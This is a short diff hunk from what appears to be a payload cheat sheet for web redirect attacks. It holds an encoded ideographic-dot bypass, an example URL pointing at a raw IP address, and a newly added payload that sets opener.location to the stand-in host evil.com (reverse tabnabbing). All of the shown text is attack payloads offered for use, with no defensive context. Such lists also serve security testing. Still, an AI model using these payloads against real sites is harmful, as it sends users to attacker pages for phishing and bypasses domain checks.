@@ -28,11 +28,13 @@
 5 - payload: {%E3%80%82}
 
 
-===>>> example: ===>>> https://20.44.36.49//google%E3%80%82com
+===>>> example: https://20.44.36.49//google%E3%80%82com
 
+6 - payload: { opener.location="https://evil.com"}
 
+===>>> example: email ===>>> inspect ===>>> console: opener.location="https://evil.com"
 
-
+7 - payload:
 
 ==================================================================
 
